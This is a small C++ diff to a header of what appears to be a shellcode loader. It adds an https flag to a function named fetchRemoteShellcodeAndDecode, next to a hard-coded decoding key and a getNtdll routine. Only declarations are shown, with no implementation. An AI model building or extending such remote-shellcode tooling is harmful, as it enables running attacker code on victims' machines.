@@ -18,7 +18,7 @@ public:
 
         std::wstring url;
         std::wstring file;
-
+        bool https = false;
         unsigned char key = 0x67;
     };
     void printHelp(const char* programName);
@@ -35,7 +35,7 @@ public:
     
 
     unsigned char* getNtdll();
-    std::vector<unsigned char> fetchRemoteShellcodeAndDecode(const std::wstring& url, const std::wstring& file, unsigned char shellcode_key);
+    std::vector<unsigned char> fetchRemoteShellcodeAndDecode(const std::wstring& url, const std::wstring& file, unsigned char shellcode_key, bool https);
    
 };
 
